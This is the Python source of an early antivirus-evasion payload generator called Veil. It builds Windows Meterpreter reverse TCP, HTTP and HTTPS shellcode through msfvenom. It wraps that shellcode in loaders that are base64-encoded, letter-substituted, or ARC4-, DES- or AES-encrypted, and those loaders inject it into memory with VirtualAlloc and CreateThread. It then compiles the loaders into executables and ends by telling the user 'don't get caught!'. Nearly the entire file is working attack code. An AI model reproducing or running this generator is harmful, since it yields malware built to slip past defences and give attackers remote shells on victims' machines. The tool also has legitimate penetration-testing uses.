#!/usr/bin/python
# Veil - by @ChrisTruncer
# AV Evasion Payload Generator

# Next Steps:
# Powershell payload
# Start looking at pyinstaller to give user choice
# Start looking into other languages (Ruby, Perl, C, C#, C++, etc.)

# Import required functionality
import commands
import fileinput
import base64
import subprocess
import os
import zlib
import string
import random
import socket
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from Crypto.Cipher import ARC4
from Crypto import Random

# Print title function
def title():
    os.system('clear')
    print "========================================================================="
    print " Veil | [Version]: 1.0 | [Updated]: 05.30.2013"
    print "========================================================================="

# Inform user that files are generated
def endmsg():
    print "\n[!] Your payload files have been generated, don't get caught!\n"    

# Set/Verify msfvenom LocalHost parameter
# A temporary solution for basic verification (not perfect, fix later).
def setLocalHost():
    global LocalHost
    LocalHost = raw_input("[?] What's the Local Host IP Address: ")
    try:
        socket.inet_aton(LocalHost)
        return setLocalPort()
    except socket.error:
        title()
        print
        print "[Error]: Bad IP address specified.\n"
        return setLocalHost()

# Set/Verify msfvenom LocalPort parameter
def setLocalPort():
    global LocalPort
    LocalPort = raw_input("[?] What's the Local Port Number: ")
    # Check if LocalPort is numeric.
    try:
        float(LocalPort)
    except ValueError:
        title()
        print
        print "[Error]: Bad port number specified.\n"
        return setLocalPort()

    # Check if LocalPort is a valid port number.
    if 1 <= int(LocalPort) <= 65535:
        return
    else:
        title()
        print
        print "[Error]: Bad port number specified.\n"
        return setLocalPort()

# Set/Verify MetPayload variable.
def payloadType():
    global MetPayload
    print '\n[?] What type of payload would you like?\n'
    print ' 1 - Reverse TCP'
    print ' 2 - Reverse HTTP'
    print ' 3 - Reverse HTTPS'
    print ' 0 - Exit Veil\n'
    MetPayload = raw_input("[>] Please enter the number of your choice: ")

    # Check if MetPayload is numeric.
    try:
        float(MetPayload)
    except ValueError:
        title()
        payloadType()

    # Check if MetPayload is a valid option.
    if MetPayload == "0":
        exit()
    elif 0 <= int(MetPayload) <= 3:
        return
    # Payload type validation check.
    else:
        title()
        payloadType()

# Function for calling MSFVenom and returning its output
def revtcpVenom():
    title()
    
    # Get Payload Type
    payloadType()

    # Call setLocalHost
    setLocalHost()

    # Create our variable that reminds the user to setup their handler
    global helpfulinfo

    # If statement for payload type
    if MetPayload == "1":
        # Build our reverse tcp based payload
        helpfulinfo = "\n[!] Be sure to set up a Reverse TCP handler with the following settings:\n\n"
        helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_tcp\n"
        helpfulinfo += " LHOST   = " + LocalHost
        helpfulinfo += "\n LPORT   = " + LocalPort
        print "[*] Generating shellcode..."
        MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+LocalHost+" LPORT="+LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"
    elif MetPayload == "2":
        # Build our reverse http payload
        helpfulinfo = "\n[!] Be sure to set up a Reverse HTTP handler with the following settings:\n\n"
        helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_http\n"
        helpfulinfo += " LHOST   = " + LocalHost
        helpfulinfo += "\n LPORT   = " + LocalPort
        print "[*] Generating shellcode..."
        # Build our reverse http based payload 
        MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_http LHOST="+LocalHost+" LPORT="+LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"
    elif MetPayload == "3":
        # Build our reverse https payload
        helpfulinfo = "\n[!] Be sure to set up a Reverse HTTPS handler with the following settings:\n\n"
        helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_https\n"
        helpfulinfo += " LHOST   = " + LocalHost
        helpfulinfo += "\n LPORT   = " + LocalPort
        print "[*] Generating shellcode..."
        # Build our reverse https based paylaod
        MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_https LHOST="+LocalHost+" LPORT="+LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"

    # Stript out extra characters, new lines, etc. Just leave the shellcode
    FuncShellcode = commands.getoutput(MsfvenomCommand)
    FuncShellcode = FuncShellcode[82:-1]
    FuncShellcode = FuncShellcode.strip()
    return FuncShellcode

# Function for generating payload supporting files
def supportingFiles():

    title()

    # Determine if the user wants pyinstaller or py2exe
    print '\n[?] How would you like to create your payload executable?\n'
    print ' 1 - Pyinstaller (default)'
    print ' 2 - Py2Exe\n'
    PyMaker = raw_input("[>] Please enter the number of your choice: ")

    # If the user chooses Py2Exe
    if PyMaker == "2":
        # Generate our setup.py file for py2exe
        SetupFile = open('setup.py', 'w')
        SetupFile.write("from distutils.core import setup\n")
        SetupFile.write("import py2exe, sys, os\n\n")
        SetupFile.write("setup(\n")
        SetupFile.write("\toptions = {'py2exe': {'bundle_files': 1}},\n")
        SetupFile.write("\tzipfile = None,\n")
        SetupFile.write("\twindows=['payload.py']\n")
        SetupFile.write(")")
        SetupFile.close()

        # Generate Batch script for compiling with py2exe on windows
        RunmeFile = open('runme.bat', 'w')
        RunmeFile.write('rem Batch Script for compiling python code into an executable\n')
        RunmeFile.write('rem on windows with py2exe\n')
        RunmeFile.write('rem Developed by @ChrisTruncer\n\n')
        RunmeFile.write('rem Usage: Drop into your Python folder and click, or anywhere if Python is in your system path\n\n')
        RunmeFile.write("python setup.py py2exe\n")
        RunmeFile.write('cd dist\n')
        RunmeFile.write('move payload.exe ../\n')
        RunmeFile.write('cd ..\n')
        RunmeFile.write('rmdir /S /Q build\n')
        RunmeFile.write('rmdir /S /Q dist\n')
        RunmeFile.close()
        print helpfulinfo    

     # Else, used pyinstaller (used by default)
    else:
        print
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/pyinstaller-2.0/pyinstaller.py --noconsole --onefile payload.py')
        os.system('mv dist/payload.exe .')
        os.system('rm -rf dist')
        os.system('rm -rf build')
        os.system('rm payload.spec')
        os.system('rm logdict*.*')
        os.system('rm payload.py')
        title()
        print helpfulinfo

# Function to randomly create variable names
def randomString():
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(15))
    return random_string

# Function for random AES Key
def aesKey():
    random_aes = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(32))
    return random_aes

def voidpointer():
    # Build our msfvenom command
    Shellcode = revtcpVenom()

    # Receive random Variable names
    RandShellcode = randomString()
    RandReverseShell = randomString()
    RandMemoryShell = randomString()

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from ctypes import *\n\n')
    PayloadFile.write(RandReverseShell + ' = \"' + Shellcode + '\"\n')
    PayloadFile.write(RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n')
    PayloadFile.write(RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n')
    PayloadFile.write(RandShellcode + '()')

    # Close the payload file
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def VirtualAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()
    
    # Receive random Variable names
    ShellcodeVariableName = randomString()
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')

    # Close the payload file
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def b64VAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()    

    # Base64 encode string
    EncodedShellcode = base64.b64encode(Shellcode)    

    # Receive random Variable names
    ShellcodeVariableName = randomString()
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()
    RandT = randomString()

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('import base64\n\n')
    PayloadFile.write(RandT + " = \"" + EncodedShellcode + "\"\n")
    PayloadFile.write(ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n")
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')

    # Close the payload file
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def LetterSubVAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()

    # Receive random Variable names
    SubbedShellcodeVariableName = randomString()
    ShellcodeVariableName = randomString()
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()
    RandDecodedLetter = randomString()
    RandCorrectLetter = randomString()
    RandSubScheme = randomString()

    # Picking letters to encode
    EncodeWithThis = "c"
    DecodeWithThis = "t"

    # Create the letter substitution scheme
    SubScheme = string.maketrans(EncodeWithThis, DecodeWithThis)

    # Allowing all characters within the shellcode
    Shellcode = Shellcode.encode("string_escape")

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from string import maketrans\n\n')
    PayloadFile.write(RandDecodedLetter + ' = "t"\n')
    PayloadFile.write(RandCorrectLetter + ' = "c"\n\n')
    PayloadFile.write(RandSubScheme + ' = maketrans('+ RandDecodedLetter +', '+ RandCorrectLetter + ')\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = \"'+ Shellcode.translate(SubScheme) +'\"\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.translate(' + RandSubScheme + ')\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + SubbedShellcodeVariableName + '.decode(\"string_escape\"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')

    # Close the payload file
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def ARCVAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()

    # Receive random variable names
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()
    ShellcodeVariableName = randomString()
    RandIV = randomString()
    RandARCKey = randomString()
    RandARCPayload = randomString()
    RandEncShellCodePayload = randomString()

    # Set our IV Value and DES Key
    iv = ''.join(random.choice(string.ascii_letters) for x in range(8))
    ARCKey = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))

    # Create DES Object and encrypt our payload
    arc4main = ARC4.new(ARCKey)
    EncShellCode = arc4main.encrypt(Shellcode)

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from Crypto.Cipher import ARC4\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(RandIV + ' = \'' + iv + '\'\n')
    PayloadFile.write(RandARCKey + ' = \'' + ARCKey + '\'\n')
    PayloadFile.write(RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n\n')
    PayloadFile.write(RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    
    # Close the Payload File
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def DESVAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()

    # Receive random variable names
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()
    ShellcodeVariableName = randomString()
    RandIV = randomString()
    RandDESKey = randomString()
    RandDESPayload = randomString()
    RandEncShellCodePayload = randomString()

    # Set our IV Value and DES Key
    iv = ''.join(random.choice(string.ascii_letters) for x in range(8))
    DESKey = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))

    # Create DES Object and encrypt our payload
    desmain = DES.new(DESKey, DES.MODE_CFB, iv)
    EncShellCode = desmain.encrypt(Shellcode)

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from Crypto.Cipher import DES\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(RandIV + ' = \'' + iv + '\'\n')
    PayloadFile.write(RandDESKey + ' = \'' + DESKey + '\'\n')
    PayloadFile.write(RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n\n')
    PayloadFile.write(RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    
    # Close the Payload File
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def AESVAlloc():
    # Receive msfvenom output
    Shellcode = revtcpVenom()

    # Receive random Variable names
    ShellcodeVariableName = randomString()
    RandPtr = randomString()
    RandBuf = randomString()
    RandHt = randomString()
    RandDecodeAES = randomString()
    RandCipherObject = randomString()
    RandDecodedShellcode = randomString()
    RandShellCode = randomString()
    RandPadding = randomString()

    # Set AES Block size and padding
    BlockSize = 32
    Padding = '{'

    # Function for padding our encrypted text to fit the block
    pad = lambda s: s + (BlockSize - len(s) % BlockSize) * Padding

    # Encrypt & Encode or Decrypt & Decode a string
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Padding)

    # Generate a random key - insert retort on rngs here
    secret = aesKey()

    # Create a cipher object with our secret key!
    cipher = AES.new(secret)

    # Encrypt our string
    EncodedShellcode = EncodeAES(cipher, Shellcode)

    # Create our payload file
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from Crypto.Cipher import AES\n')
    PayloadFile.write('import base64\n')
    PayloadFile.write('import os\n\n')
    PayloadFile.write(RandPadding + ' = \'{\'\n') 
    PayloadFile.write(RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n')
    PayloadFile.write(RandCipherObject + ' = AES.new(\'' + secret + '\')\n')
    PayloadFile.write(RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n')
    PayloadFile.write(RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')    

    # Close the payload file
    PayloadFile.close()

    # Create our payload supporting files and end
    supportingFiles()
    endmsg()

def main():
    PayloadChoice = {0 : exit,
    1 : voidpointer,
    2 : VirtualAlloc,
    3 : b64VAlloc,
    4 : LetterSubVAlloc,
    5 : ARCVAlloc,
    6 : DESVAlloc,
    7 : AESVAlloc
    }

    # Clear the terminal and print out welcome message
    title()
    print " [By]: Chris Tuncer | [Twitter]: @ChrisTruncer"
    print "========================================================================="
    print
    print "[?] What payload type would you like to use?"
    print

    # Output all payload types
    print " 1 - Meterpreter - Python - void pointer"
    print " 2 - Meterpreter - Python - VirtualAlloc()"
    print " 3 - Meterpreter - Python - base64 Encoded"
    print " 4 - Meterpreter - Python - Letter Substitution"
    print " 5 - Meterpreter - Python - ARC4 Stream Cipher"
    print " 6 - Meterpreter - Python - DES Encrypted"
    print " 7 - Meterpreter - Python - AES Encrypted"
    print " 0 - Exit Veil\n"

    # Receive payload number selection
    PayloadType = raw_input("[>] Please enter the number of your choice: ")

    # Check if PayloadType is numeric.
    try:
        float(PayloadType)
    except ValueError:
        return main()

    # Check if MetPayload is a valid option.
    if 0 <= int(PayloadType) <= 7:
        PayloadChoice[int(PayloadType)]()
    else:
        main()

# Start Veil
main()
